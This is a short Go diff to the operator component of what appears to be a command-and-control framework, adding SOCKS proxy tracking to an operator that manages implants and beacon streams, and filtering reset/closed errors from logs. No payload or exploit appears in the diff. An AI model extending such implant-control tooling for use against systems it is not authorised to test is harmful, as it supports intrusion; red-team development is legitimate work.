@@ -9,6 +9,7 @@ import (
 	"net"
 	"os"
 	"sort"
+	"strings"
 	"sync"
 	"time"
 
@@ -48,13 +49,15 @@ type ImplantRecord struct {
 }
 
 type Operator struct {
-	keys     *cryptography.OperatorKey
-	node     *transport.Node
-	messenger *transport.Messenger
-	implants map[string]*ImplantRecord
-	mu       sync.RWMutex
-	ctx      context.Context
-	cancel   context.CancelFunc
+	keys        *cryptography.OperatorKey
+	node        *transport.Node
+	messenger   *transport.Messenger
+	implants    map[string]*ImplantRecord
+	mu          sync.RWMutex
+	ctx         context.Context
+	cancel      context.CancelFunc
+	socksProxies map[int]*SocksInstance
+	socksMu     sync.Mutex
 }
 
 func NewOperator(ctx context.Context, keys *cryptography.OperatorKey, relayAddrs []string) (*Operator, error) {
@@ -81,11 +84,12 @@ func NewOperator(ctx context.Context, keys *cryptography.OperatorKey, relayAddrs
 	}
 
 	o := &Operator{
-		keys:     keys,
-		node:     node,
-		implants: make(map[string]*ImplantRecord),
-		ctx:      ctx,
-		cancel:   cancel,
+		keys:         keys,
+		node:         node,
+		implants:     make(map[string]*ImplantRecord),
+		socksProxies: make(map[int]*SocksInstance),
+		ctx:          ctx,
+		cancel:       cancel,
 	}
 
 	o.messenger = transport.NewOperatorMessenger(ctx, node, keys)
@@ -235,7 +239,8 @@ func (o *Operator) handleBeaconStream(s network.Stream) {
 	for {
 		var msgLen uint32
 		if err := binary.Read(s, binary.LittleEndian, &msgLen); err != nil {
-			if err.Error() != "EOF" {
+			errStr := err.Error()
+			if errStr != "EOF" && !strings.Contains(errStr, "reset") && !strings.Contains(errStr, "closed") {
 				log.Printf("[operator] beacon stream read len: %v", err)
 			}
 			return
